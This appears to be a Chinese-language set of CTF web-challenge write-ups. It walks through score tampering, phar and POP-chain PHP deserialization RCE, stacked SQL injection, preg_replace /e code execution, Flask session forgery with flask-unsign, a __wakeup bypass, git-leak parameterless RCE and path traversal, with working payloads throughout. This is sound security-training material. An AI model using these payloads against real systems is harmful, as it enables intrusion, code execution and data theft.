    Stage3 — 重生之我在零重力屋顶当"卷王"

    题目是个小游戏：控制碰星娘飞过星环，攒到 3000 分才能领终点奖励。

    做这种题的第一步：F12

    做这种类型的题目，重要的是打开 F12、打开 Network，先玩一局，看它都发送了哪些请求。

    一局下来就两个请求：

    POST /api/run     201    开局
POST /api/claim   403    结算

    盯住 claim

    claim 出现了 grades 这个字段，对其进行 base64 解码：

    eyJzY29yZSI6MH0=   →   {"score":0}

    这不就是我的得分吗？那这里就明确了。

    {
  "runId": "9b337580-62ae-4e0a-9a90-96a5e17095ad",
  "grades": "eyJzY29yZSI6MH0="
}

    分数是浏览器自己算出来、自己 base64 一下、再交给服务器的 —— 服务器完全相信这个数字。

    base64 只是编码，不是加密，也不是签名。

    ⚠️ 有个先后依赖：/api/run 返回的不只是 runId，还有 expiresInSeconds: 1800（30 分钟有效）。

    所以不能只发 claim —— 得先拿一个有效的 runId，再拿它去结算。

    改分数

    直接修改分数为 3000，再做一次 base64 编码，抓包改掉 grades，发回去：

    {"score":3000}  →  eyJzY29yZSI6MzAwMH0=

    成功得到 flag。

    {
  "ok": true,
  "code": "TARGET_REACHED",
  "message": "终点信号已解锁",
  "score": 3000,
  "target": 3000,
  "flag": "ZeroG{...}"
}

    补充：为什么 base64 挡不住

    这段代码其实自己就写着答案：

    function encodeGrades(score) {
  return btoa(JSON.stringify({ score }));   // btoa = base64 编码
}

    函数名是 encode，不是 sign。

    这四个词的区别值得记：

    词 含义 能不能防改
    encode 编码（base64、hex、URL） ❌ 只是换衣服，谁都能脱
    encrypt 加密（AES、RSA） ✅ 但要密钥
    hash 哈希（md5、sha256） ✅ 单向，但这里只存不比对
    sign 签名（HMAC、RSA 签名） ✅ 改了就对不上

    只有最后一种能真正防篡改 —— 因为它需要服务器持有的密钥，前端拿不到。

    这类题的通法

    ① F12 → Network，玩一局，看发了哪些请求
② 找到"提交结果"的那个请求
③ 看提交的字段是怎么产生的：
     · 明文？          → 直接改
     · base64 / hex？  → 编码而已，解开改
     · 带签名？        → 找密钥（前端藏了也能拿到）
     · 服务器发的 token？→ 看能不能复用
④ 这个值是服务器算的，还是浏览器算的？
     浏览器算的 → 一定能伪造
     服务器算的 → 得去找逻辑漏洞

    这道题属于第 ④ 条最简单的那种：分数完完全全是浏览器算的。

    [HNCTF 2022 WEEK3] ez_phar

    源码

    <?php
show_source(__FILE__);
class Flag{
    public $code;
    public function __destruct(){
        // TODO: Implement __destruct() method.
        eval($this->code);
    }
}
$filename = $_GET['filename'];
file_exists($filename);
?>
upload something

    审计代码发现只要触发 __destruct 就可以执行代码，所以要想办法触发 __destruct。

    想到 phar 反序列化可以在没有 unserialize() 的情况下触发 __destruct —— 代码里唯一的入口就是 file_exists($filename)，而它正好是能吃 phar:// 的文件函数。

    为什么能这样：phar 文件的 manifest 里可以存一段序列化 metadata；任何函数只要访问 phar:// 开头的路径，PHP 就会解析这个 phar，解析时把 metadata 自动反序列化 —— 于是对象被重建，脚本结束时 __destruct() 自动执行。

    找上传点

    源代码强调了 upload，去访问一下 upload.php。

    先随便尝试上传一个 txt 文件，提示只能 jpg/jpeg。

    将 txt 文件修改后缀可以直接上传，所以就明确了这道题的方向：构造一个 phar 文件，修改后缀为 jpg 上传之后通过 phar:// 触发。

    造 phar

    <?php
class Flag {
    public $code;
}

$f = new Flag();
$f->code = "system('cat /fffl11laaaggg');";   // 第一步是 ls / 先找到 flag 文件

$p = new Phar(__DIR__.'/b.phar');
$p->startBuffering();
$p->addFromString('test.txt', 'x');
$p->setStub('<?php __HALT_COMPILER(); ?>');
$p->setMetadata($f);
$p->stopBuffering();
?>

    php 文件写好后通过 shell 执行：

    php.exe -d phar.readonly=0 ds.php

    就会生成一个 b.phar 的文件，将其后缀改完后上传。

    触发

    第一次我让 code 写的是 ls /（想先找 flag 文件），页面返回：

    Parse error: syntax error, unexpected end of file
in /var/www/html/index.php(7) : eval()'d code on line 1

    这行报错其实是最好的证据** —— 它同时说明了三件事：**

    报错里的信息 说明
    eval()'d code __destruct() 真的执行了
    index.php(7) 就是源码里 eval($this->code); 那一行
    syntax error phar 被解析、metadata 反序列化成功，只是 ls / 不是合法 PHP

    也就是说链路已经通了，只是内容不对。 把 code 换成合法的 PHP 语句后：

    最终 payload：

    ?filename=phar://upload/b.jpg/test.txt

    成功得到 flag。

    [强网杯 2019] 随便注

    先试万能密码：

    1' or 1=1-- -

    看着是没什么用的。

    接着试其他的，发现了 select 等被过滤了：

    那么时间盲注、报错注入、联合查询、布尔盲注就都无法使用了 —— 这几种要么离不开 select，要么离不开 where。

    还有一处容易漏看：过滤名单里带了 \.（点）。点被挡，意味着 information_schema.tables 这种写法根本发不出去 —— 所以后面查表只能靠 show tables，不是因为我们想省 select，是因为连表名都没法用点拼出来。

    那就试试堆叠注入。堆叠查询可以一次执行多条独立语句，show、handler、rename、alter 这些都不需要 select，正好绕开过滤。

    发现可以。那么就分别进行查表和查列：

    1';show tables;-- -

    查到两个表：1919810931114514 和 words。

    1';show columns from `1919810931114514`;-- -


    1';show columns from `words`;-- -

    words 表里没有 flag。

    到这里有两种做法。

    做法一：handler

    handler 就是直接打开一张表、按行读：

    通过 handler 可以直接查询到 flag：

    1';handler `1919810931114514` open;
handler `1919810931114514` read first;
handler `1919810931114514` close;-- -

    得到 flag。

    注意：作为表名的数字要用反引号括起来 —— 1919810931114514 是一个以数字开头的名字，不加引号 MySQL 不认它是标识符。Linux 下单引号和反引号都可以（单引号在进 MySQL 之前就被 shell 吃掉了），Windows 下只能用反引号。

    做法二：改表名，让原始查询帮我查

    这里我们先推测初始查询语句。

    首先通过 1' -- - 的回显判断出是单引号闭合的。

    再通过 show 堆叠查询到两个表，通过查询发现 words 中有两个列，但是那个数字表中只有一个列。

    那么因为在初始查询的时候它返回的是两个列，所以这里就知道了它的语句是：

    select * from words where 列 = '1';

    至于为什么是 select *，是因为它回显有两个列；一个列返回的是数字，一个列返回的是数据，这里就可以知道查询的是 id 了。

    所以最初的查询语句应该为：

    select * from words where id = '$inject'

    所以到了这里我们就可以利用它固定的原始语句来查询了。既然它查的表名列名分别为 words 和 id，那我们就把 flag 所在的表名和列名修改为 words 和 id：

    1';rename table words to everything;
rename `1919810931114514` to words;
alter table words change flag id VARCHAR(100);-- -

    接着再用万能密码：

    1' or 1=1-- -

    成功得到 flag。

    这里有个地方值得停一下：rename 之后新的 words 表只剩 id 一列，而原始语句是 select *，页面是按两列渲染的 —— 少一列为什么还能出？

    我这边是直接出的 flag，没有报错。所以 PHP 那边应该只是把第一列取出来显示，缺第二列不影响，顶多是个 Notice 被吞掉了。

    [MRCTF2020] Ezpop

    先审计代码

    发现是 PHP 序列化串（先附上相关知识点）：

    从终点往回找

    先找可以执行的地方。

    在 Modifier 类的 append 下有 include 可以利用，而调用 include 需要先有 __invoke 的调用。

    触发 __invoke 的方式是有对象被当成函数来调用，所以去找哪里是可以把对象当成函数来调用的 —— 观察到在 Test 类的 __get() 里会调用 $function()，也就达成了 __invoke 的触发要求。

    再看 __get 的触发条件：当访问不存在的属性时会被调用。也就是说，访问 Test 类中不存在的属性时会被调用。

    所以这里再去看最后一个类，发现 __toString 中会去访问 $this->str->source —— 这里我们只要让 str 为 Test 类，那它去访问 str->source 时就会触发 __get。

    接着要考虑 __toString 的触发条件：当把一个对象当成字符串来执行时会触发。

    那很明显就是 preg_match：

    preg_match('/正则表达式/', $字符串, $匹配结果数组);

    这里他把 $this->source 放进了 preg_match 的第二个参数，所以我们只要让他作为一个类 —— 又因为要同时包含 str，所以只能是 Show 类。

    最后是如何触发 __wakeup：它的触发条件是当使用 unserialize 时触发，那么就完成了闭环。

    逆推方向（找链的顺序）

    include ← __invoke ← __get ← __toString ← __wakeup ← unserialize($_GET['pop'])

    这是从终点往入口找的顺序。

    正向执行顺序（实际跑起来的样子）

    unserialize($_GET['pop'])
    → Show::__wakeup()          preg_match(..., $this->source) 把对象当字符串
    → Show::__toString()        $this->str->source 读不存在的属性
    → Test::__get('source')     $function = $this->p; $function()
    → Modifier::__invoke()      $this->append($this->var)
    → Modifier::append()        include($value)

    这条 POP 链就走完了。

    构造序列化

    class Modifier {
    protected $var = "php://filter/convert.base64-encode/resource=flag.php";
}
class Test { public $p; }
class Show { public $source; public $str; }

$pop = new Show;
$pop->source = new Show;        // 外层 source → 内层 Show（触发 __toString）
$pop->source->str = new Test;   // 内层的 str → Test（触发 __get）
$pop->source->str->p = new Modifier;   // Test 的 p → Modifier（触发 __invoke）
echo serialize($pop);
echo ("<br>");
echo urlencode(serialize($pop));

    四层的分工：

    层 属性 给谁用
    外层 Show source __wakeup 的 preg_match
    内层 Show str __toString 的 $this->str
    Test p __get 的 $function
    Modifier var append 的 include

    为什么要用伪协议

    这里因为直接 include 会把 PHP 代码执行掉（而 flag.php 里没有 echo，执行完什么都不输出）， 所以我们利用伪协议先把它编码成 base64 —— 编码后的文本不含 <?php，include 就会原样输出而不是执行。

    php://filter/convert.base64-encode/resource=flag.php

    \0 的坑

    注意：因为 var 的属性是 protected，序列化时会生成 \0*\0var（长度 6，两个空字节也算）。

    但是如果你直接把它复制到 URL 上，这两个空字节会被吞掉，s:6:"*var" 长度就对不上了。

    所以生成时最好就直接 urlencode()，避免出错：

    echo urlencode(serialize($pop));

    编码后这一小段是 s:6:%22%00*%00var%22。

    拿 flag

    最后得到 base64 编码的 flag，解码就好了。

    ?pop=<urlencode 后的整条串>
→ 页面吐出 base64
→ 解码 → flag.php 源码 → flag

    这题的收获

    第一次做 POP 链，最有用的一条是：

    不能从头读代码，要从能干活的那个函数（sink）往回找。

    ① 找 sink      include / eval / system / call_user_func
② 谁能碰到它    哪个魔术方法里调用了它
③ 那个魔术方法怎么触发   对象当字符串？当函数？读不存在的属性？
④ 一路往回，直到 unserialize

    中间那条 __get 最容易绕晕：它不是"属性值为空"，而是"这个类里根本没有这个属性"。 Test 只有 $p，所以读 ->source 必然触发 —— 你什么都不用设。

    [BJDCTF2020] ZJCTF，不过如此

    第一层：text 限制

    $text = $_GET["text"];
$file = $_GET["file"];

if(isset($text) && (file_get_contents($text,'r') === "I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/", $file)){
        die("Not now!");
    }
    include($file);  //next.php
}

    审计代码，观察 text 有内容限制才能走到 include。

    而且 file_get_contents($text,'r') 的 第一个参数是 $text 本身 —— 也就是说 $text 得是一个「能被读取的东西」，不一定是文件路径。

    这里想到用 data 协议，让 file_get_contents 直接读到我们指定的字符串：

    /?text=data://text/plain,I have a dream

    注意：这一步要让 file_get_contents($text) 返回 I have a dream，不是写文件。

    第二层：include 把 next.php 执行了

    接着构造：

    /?text=data://text/plain,I have a dream&file=next.php

    但是页面并没有给出文件内容 —— 因为 include 把 next.php 当成代码执行了，而不是读出来显示。

    所以改用 php 伪协议 读源码（convert.base64-encode 让它不被执行）：

    /?text=data://text/plain,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php

    解码后得到 next.php 的源码。

    next.php 源码

    <?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}

foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
    @eval($_GET['cmd']);
}

    先看 foreach：它把 GET 得到的名字传给 $re，值传给 $str。

    接着看这个最重要的正则表达式：i 是忽略大小写，e 是 eval，(...) 把整个匹配包成了捕获组 1，也就是 strtolower 里的 \1；在 PHP 单引号中的 \\1 等效于 \1。

    $re 到底在干什么

    $re 就是 URL 里参数的名字，它被直接拼进了正则。

    foreach($_GET as $re => $str)     // $re = 参数名,$str = 参数值
      ↓
'/(' . $re . ')/ei'              // 参数名成了正则主体

    所以 $re 决定了三件事：

    $re 决定 说明
    匹配什么 它必须能匹配到 $str 里的内容，否则 \1 拿不到东西，注入不成立
    捕获组 1 是什么 整个 $re 被 (...) 包住，所以匹配到的内容就是 \1
    替换串里塞进什么 \1 被原样拼进 strtolower("\1")，然后整体被 eval

    反过来说：

    想要代码执行,必须让 匹配到的内容 = 我们的 payload
而"匹配到的内容"由 $re 决定
→ 所以 $re 必须是一个"什么都匹配"的宽泛正则

    还有两个约束：

    ① $re 里不能有 /      → 会把正则模式提前截断
② $re 不能是 .        → PHP 会把参数名里的 . 换成 _

    /e 为什么能执行代码

    替换串是 strtolower("\1")。带 e 修饰符时，替换串会先做反向引用替换，再把结果当成 PHP 代码执行。

    而 \1 在双引号里，所以只要捕获到的内容带 " 或 ${...}，就能跳出字符串变成真代码。

    PHP 5.x 里 ${表达式} 会对表达式求值：

    strtolower("${phpinfo()}")
           └────┬─────┘
        执行 phpinfo()

    所以我们要做的，就是把 \1 的位置变成 ${getFlag()}。

    试错过程

    先试：

    /?.*=${phpinfo()}

    页面无回显。

    原因：PHP 解析 URL 参数时会把参数名里的 . 和空格统一换成 _，所以 .* 变成了 _*，正则变成 /(_*)/ei —— 匹配不到 ${phpinfo()}，所以没反应。

    换 \S（匹配任意非空白字符）代替 .：

    /?\S*=${phpinfo()}

    成功得到回显。

    为什么必须大写 S

    \S = 非空白字符（大写 S 是「非」）。

    \s = 空白字符 —— 写反了就匹配不到 ${phpinfo()}。

    最终 payload

    /next.php?\S*=${getFlag()}&cmd=system('cat /f*');

    注意最后要有分号 —— eval 执行时需要 ; 作为一条代码的结束。

    CTF2{4497b560-3b8c-48c7-9991-bc1d0d9bce8c}

    为什么 cmd 末尾的分号不能省

    getFlag() 里是：

    @eval($_GET['cmd']);

    所以实际执行的是 eval("system('cat /f*');")。

    eval 把字符串当代码重新解析，必须是一条完整语句：

    eval('echo "A"');    // ❌ syntax error, unexpected end of file, expecting ';'
eval('echo "A";');   // ✅

    完整链路

    ① data:// 骗过 file_get_contents     text=data://text/plain,I have a dream
② php://filter 读源码(不执行)        file=php://filter/read=convert.base64-encode/resource=next.php
③ 看懂 foreach:参数名=正则           $re
④ /e 让替换串被 eval                 strtolower("\1")
⑤ 用 \S* 当参数名(避开 . 被吃)       ?\S*=${phpinfo()}
⑥ 调 getFlag() 并带 cmd              ?\S*=${getFlag()}&cmd=system('cat /f*');

    知识点

    点 内容
    data:// 让 file_get_contents 读到指定内容
    php://filter 读源码而不执行（convert.base64-encode）
    /e 修饰符 PHP 5.x 专用，替换串被 eval；PHP 7 已移除
    ${表达式} PHP 双引号插值里会对表达式求值（{} 单层，不是 {{}}）
    参数名即输入 foreach($_GET as $re => $str) 让参数名成了攻击面
    parse_str 的坑 参数名里 . 和空格会变成 _

    [DASCTF] FileHandler 反序列化

    打开题目直接就是源码，highlight_file 把整个文件摊出来了。先审计。

    <?php
include("flag.php");
highlight_file(__FILE__);

class FileHandler {
    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            ...
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }
}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {
    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }
}

    判断

    第一件事：include("flag.php") 说明 flag 和入口同目录，而且我们要的是它的源码，不是执行结果。

    file_get_contents 不走 PHP 解析器，读出来就是磁盘上的原文。这一点是这题的关键 —— 不是去读"执行后输出"，是直接把文件读出来。

    第二件事：只有 read() 能读文件，怎么进去？

    入口只有 unserialize，唯一的触发点是 __destruct：

    __destruct() → process() → read()

    但中间有两道类型检查：

    位置 写法 作用
    __destruct $this->op === "2" 强比较 字符串 "2" 会被改成 "1"，走 write
    process $this->op == "2" 弱比较 整数 2 也成立，走 read

    所以 op 必须序列化成整数：

    s:2:"op";i:2;

    第三件事：属性是 protected，怎么绕 is_valid？

    protected 属性序列化后是 \0*\0op（两个空字节夹一个星号），而 is_valid 卡的是 ord() >= 32，空字节 ord = 0 直接被拒。

    但这题根本不用碰空字节 —— unserialize 不对属性做检验，所以构建序列化串的时候直接用 public 属性名就行，protected $op 一样写得进去：

    s:2:"op";i:2;        ← 属性是 protected，但这里按 public 写

    最终 payload

    /?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:0:"";}

    返回：

    [Result]: <br><?php $flag='CTF2{a8da662d-ba4e-44da-9655-ffd89b301ecb}';

    页面为什么看着什么都没有

    两个原因叠在一起：

    1. 浏览器把 <? 当成 bogus comment（无效注释），一路吞到下一个 >，所以这段字不在渲染结果里 —— Ctrl+U 看源代码就有；
    2. __destruct 是在脚本结束时才触发的，输出天然追加在页面最末尾、highlight_file 的源码后面。

    收获

    • 同一个属性在不同位置可以是不同类型检查：=== "2" 拦字符串，== "2" 收整数。找"哪个类型能同时过两道"比硬刚一个点快。
    • unserialize 不做可见性检查：protected / private 的空字节前缀不是必须的，public 名字一样能写进去。序列化里的可见性前缀只影响"生成时怎么写"，不限制"解析时怎么读"。
    • file_get_contents 读的是源码：想拿 PHP 文件的原文用它，不是 include。
    • __destruct 是最好用的触发器：对象没人接住也会在脚本结束时析构，unserialize 完什么都不用做。

    进阶：真要写 protected 形式的话

    is_valid 拦空字节，但 PHP 反序列化支持大写 S 的转义字符串，\00 在原文里是 3 个可打印字符（\、0、0，全在 32~125 之间），unserialize 时才还原成空字节：

    S:5:"\00*\00op";i:2;

    这一招专门用于绕过"禁止空字节"的过滤器，记进反序列化专题。

    Stage1 · FlaskLogin

    这道题强调这是一个用 Flask 做的站点。

    登录

    页面提示「guest / 123456 之类的弱口令可能还在」。

    试了 123456 不行，换 guest123 进去了。

    登录后是普通用户空间：

    页面提示：

    试试看看你的「身份」是怎么被网站记住的？（F12 → Application → Cookies，那个 session cookie 引起了我的注意）

    Firefox 里 Cookie 在哪

    Firefox 的 Cookie 在「存储」(Storage) 面板里，不在「应用程序」里。

    Chrome：Application → Cookies Firefox：存储 → Cookie

    看 Cookie

    看到 session 的值是：

    eyJ1c2VyIjoiZ3Vlc3QifQ.atybFQ.0due7kkk3LdRwoQPSckRCSMWv88

    注意：只有第一段是 base64，整条不是。

    把第一段 eyJ1c2VyIjoiZ3Vlc3QifQ 拿去 base64 解码：

    {"user":"guest"}

    得到身份就是这一小段 JSON。

    认出格式

    整条值长这样：

    eyJ1c2VyIjoiZ3Vlc3QifQ . atybFQ . 0due7kkk3LdRwoQPSckRCSMWv88
└───── 数据 ─────┘    └时间戳┘  └──────── HMAC 签名 ────────┘

    这是 Flask 默认的签名 session 格式：

    base64(JSON) . base64(时间戳) . base64(HMAC-SHA1)

    签名是拿 SECRET_KEY 对整个 数据.时间戳 算出来的。

    直接改 user 为 admin？不行

    把 {"user":"guest"} 改成 {"user":"admin"} 再 base64 回去，塞进 Cookie —— 会被弹回登录页（302）。

    因为签名是对内容算的，内容一改，签名就对不上，服务端直接判无效。

    所以要改身份，必须先拿到 SECRET_KEY，自己重新签一个。

    找 SECRET_KEY

    先用 flask 工具爆破字典：

    python -m pip install flask-unsign -i https://pypi.tuna.tsinghua.edu.cn/simple

'secret','dev','changeme','ctf2026' | Set-Content wl.txt
python -m flask_unsign --unsign --cookie "eyJ1c2VyIjoiZ3Vlc3QifQ.atybFQ.0due7kkk3LdRwoQPSckRCSMWv88" --wordlist wl.txt

    同时注意到页面上的 ctf2026（登录页标题 🔑 ctf2026）—— 拿它当 secret 一试就中。

    重新签名

    python.exe -m flask_unsign --sign --cookie "{'user': 'admin'}" --secret ctf2026

    注意 --cookie 用的是 Python 字典语法（单引号），不是 JSON。

    输出一条新的：

    eyJ1c2VyIjoiYWRtaW4ifQ.atyPOw.5-D0uOFDLKt18mszGkl5W9CVBGE

    把它整个替换掉 Cookie 里的 session 值，刷新。

    两个常见坑

    ① 密钥别打错：ctf2026 是 7 个字符，写成 ctf20206 就废了。

    ② 替换的是整条（三段都要），不是只换第一段。

    拿到 flag

    flag{fl4sk_s3ss10n_1s_n07_s3cur3}

    这题的完整链路

    ① 弱口令登录        guest / guest123
② 观察 session      eyJ1c2VyIjoiZ3Vlc3QifQ.atybFQ.xxx
③ 解码第一段        {"user":"guest"}
④ 认出格式          base64(数据) . 时间戳 . HMAC 签名   ← Flask
⑤ 直接改内容        ❌ 302（签名校验失败）
⑥ 找 SECRET_KEY     页面标题 ctf2026 / flask-unsign 爆破
⑦ 自己重新签名      flask-unsign --sign --cookie "{'user':'admin'}" --secret ctf2026
⑧ 替换整条 Cookie   → 👑 Welcome, admin → flag

    知识点

    这题的核心是区分两件事：

    情况 能不能改
    Cookie 里存明文身份 ✅ 随便改（和前面米米那题第四关一样）
    Cookie 里存签名过的身份 ❌ 改了签名就废，除非拿到密钥

    Flask 的 session 属于第二种 —— 默认用 SECRET_KEY 做 HMAC-SHA1 签名。

    所以「Flask 站点 + session cookie」这个组合，标准套路就是：

    先试着解码 → 认出 .时间戳.签名 三段式 → 上 flask-unsign

    工具备忘

    # 只看内容,不需要密钥
python -m flask_unsign --decode --cookie "eyJ..."

# 爆破密钥
python -m flask_unsign --unsign --cookie "eyJ..." --wordlist wl.txt

# 用已知密钥伪造
python -m flask_unsign --sign --cookie "{'user':'admin'}" --secret ctf2026

    [极客大挑战 2019] PHP

    这道题点进去后，它说有做备份的习惯。查看源代码没啥东西后，使用 dirsearch 开始扫：

    发现了 www.zip，下载下来后发现了几个源代码，一个一个查看。

    先看 flag.php

    里面的 flag 是假的。

    再看 index.php

    审计发现了参数是 select：

    include 'class.php';
$select = $_GET['select'];
$res = unserialize(@$select);

    最后看 class.php

    得知需要让 username = admin，password = 100；再反序列化。

    function __destruct() {
    if ($this->password != 100) {
        echo "</br>NO!!!hacker!!!</br>";
        echo "You name is: ";
        echo $this->username; echo "</br>";
        echo "You password is: ";
        echo $this->password; echo "</br>";
        die();
    }
    if ($this->username === 'admin') {
        global $flag;
        echo $flag;
    } else {
        echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
        die();
    }
}

    绕过 __wakeup

    先进行序列化：

    $a = new Name('admin', 100);
echo serialize($a);

    但是要注意这里的 __wakeup()，它会直接将 username 修改为 guest：

    function __wakeup() {
    $this->username = 'guest';
}

    所以这里必须绕过。利用的办法是：当序列化串声明的属性个数大于实际属性个数时，会直接跳过 __wakeup()。

    所以这里把属性数由 2 改为 3。

    这个技巧有版本限制

    这是 CVE-2016-7124，影响 PHP < 5.6.25 / 7.0.10。

    在 PHP 7.4 上实测：O:4:"Name":3:{...} 会直接解析失败（不是跳过 __wakeup，是整个包解析不了）。

    关于 %00

    另外，直接将这个复制到 URL 上时，private 属性名两侧的 %00 会被吞掉，所以先进行 URL 编码再放上去，或者放上去之后再自己手补 %00。

    最终 payload

    /?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}

    O:4:"Name":3: 后面那个冒号不能丢

    ✅ O:4:"Name":3:{...}

    ❌ O:4:"Name":3{...} ← 少一个冒号，unserialize 直接返回 false

    成功得到 flag：

    补充：private 和 public 的序列化区别

    private 属性下，构造的序列化串是「类名 + 属性名」的形式（别忘了 %00）：

    s:14:"\0Name\0username"      ← \0 + Name + \0 + username = 1+4+1+8 = 14

    而 public 方式只是属性名的形式：

    s:8:"username"

    protected 则是 \0*\0属性名。

    长度一律按真实字节数算，\0 算 1 个字节 —— 这也是手写 payload 最容易错的地方。

    [GXYCTF2019] 禁止套娃

    启动靶场后页面上只有一句话，查看页面源码也什么都没有，所以试试 dirsearch 扫一下：

    dirsearch -u "https://6d6e483f4f929559a47891f1.http-ctf2.dasctf.com/"

    扫出来发现了好多 .git。

    git 泄露是什么

    去稍微了解了一下 git leakage 的本质：在运行 git init 初始化代码库时，会在当前目录下面产生一个 .git 的隐藏文件，这个文件包含了所有的 git 存储和操作的对象记录。

    而开发或运维人员把这个 .git 文件一并上传到了线上环境的 web 根目录，就导致了 git leakage。

    用 git-dumper 拉下来

    git-dumper "https://6d6e483f4f929559a47891f1.http-ctf2.dasctf.com/.git/" "E:\ctf-work\gitleak"

    别漏了 /.git/

    是 /.git/ —— 带点、带末尾斜杠。dirsearch 扫出来的路径就是 /.git/HEAD 这种形式。

    拉下来后查看 index.php 进行代码审计。

    三层过滤

    看到是对 exp 的三层过滤。

    第一层很简单，只过滤了伪协议（data:// filter:// php:// phar://）。

    第二层是：

    if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp']))

    这里正则把「函数名(...) 这种整体结构」全部替换成 null，最后要求只剩下 ;。

    所以能用的只有「无参数函数调用」这一种形态 —— .、/ 这些字符不在这个语法里，替换不掉，因此不能用。

    实测：这条正则到底删什么 
    abc          →  abc          裸字母不删
foo();       →  ;            整体删掉
a.b();       →  a.;          括号结构删了,. 留下
system(ls);  →  system(ls);  有参数,一个都不删

    第三层再过滤关键词 et|na|info|dec|bin|hex|oct|pi|log。

    关于 (?R)?

    这里的 (?R)? 刚开始我不太明白它的作用，看了点资料了解了下：

    单个 (?R) 是无限递归地去匹配括号 —— 比如 (())，在没有递归的情况下，替换掉最里面一个 () 就停止了；加了 (?R) 之后才能把整块嵌套都吃掉。

    但光有 (?R) 会无限递归（每一层都强制要求再来一层，任何有限字符串都匹配不了），所以后面再加一个 ?。

    外面这个 ? 只作用于紧挨着它的 (?R)，意思是「0 次或 1 次」—— 当最内层的 () 为空时，递归就停下来，而不是无限循环。

    到这里就清晰了：这是无参数 RCE。

    第一步：列目录

    ?exp=print_r(scandir(pos(localeconv())));

    最后的 ; 别漏了

    校验条件是「删完只剩 ;」，所以 payload 末尾必须有一个分号。

    本意是构造 print_r(scandir('.'))，但 . 不能用，所以用了 localeconv() —— 它用于获取本地化（locale）设置的数字及货币格式信息，如小数点、千位分隔符、货币符号等，帮助程序适配不同地域的显示规则；因为它第一个返回的就是 .。

    pos() 和 current() 等价，获取当前元素的值；空数组或指针无效时返回 false。

    结果：

    Array ( [0] => . [1] => .. [2] => .git [3] => flag.php [4] => index.php )

    第二步：读 flag

    读取到后发现 flag.php 在倒数第二个，所以选择先逆转数组，再用 next：

    ?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));

    成功得到 flag：

    踩的坑

    git-dumper 的路径

    写成 /git 拉不下来，必须是 /.git/。dirsearch 扫出来的 .git/HEAD 就是答案 —— 别自己"简化"。

    [HCTF 2018] WarmUp

    这道题打开一个靶场后就一个滑稽笑脸，查看页面源代码，发现 source.php，访问后进行代码审计。

    代码结构

    代码由两部分做成。

    前半部分是函数的实现（class emmm 里的 checkFile），后半部分是调用：

    if (!empty($_REQUEST['file'])
    && is_string($_REQUEST['file'])
    && emmm::checkFile($_REQUEST['file'])
) {
    include $_REQUEST['file'];
    exit;
} else {
    echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
}

    先看 hint.php，它给了 flag 的名字。

    checkFile 的三轮检查

    白名单只有两个：

    $whitelist = ["source" => "source.php", "hint" => "hint.php"];

    然后对传入的 $page 做三轮判断：

    ① 原样比对
   if (in_array($page, $whitelist)) return true;

② 截断到 ? 再比对
   $_page = mb_substr($page, 0, mb_strpos($page . '?', '?'));
   if (in_array($_page, $whitelist)) return true;

③ urldecode 之后再截断到 ? 再比对
   $_page = urldecode($page);
   $_page = mb_substr($_page, 0, mb_strpos($_page . '?', '?'));
   if (in_array($_page, $whitelist)) return true;

都不过 → echo "you can't see it"; return false;

    核心就是第 ② 轮：mb_strpos($page . '?', '?') 找到第一个问号，只把问号前面那一段拿去比对。

    所以只要开头是 source.php，后面接什么都行。

    构造 payload

    ?file=source.php?/../../../../ffffllllaaaagggg

    ../ 的数量

    一个一个往上加，直到跳出 web 根目录，正好够到 /ffffllllaaaagggg。

    为什么能过：

    checkFile 看到:  source.php?/../../../../ffffllllaaaagggg
                 └────┬────┘
                 截断到 ? → "source.php" → 在白名单里 ✅

include 拿到:    source.php?/../../../../ffffllllaaaagggg
                 └─ 整条原样送进去,? 后面的 ../ 才发挥作用

    校验看的是"截断后"，include 用的是"整条" —— 两者不是同一个字符串。

    得到 flag

    这道题的要点

    ① 校验和使用的字符串不一致

    checkFile 用 $_page(截断后的)
include   用 $_REQUEST['file'](原始的)

    和路径遍历那六关是同一个模型：校验发生在哪一步，绕过就发生在哪一步之前。

    ② 还有个没被用上的口子

    第 ③ 轮是 urldecode 之后才截断 —— 这意味着 %3f 编码的问号也能触发截断。这次没用上，但换一道题可能就得靠它。
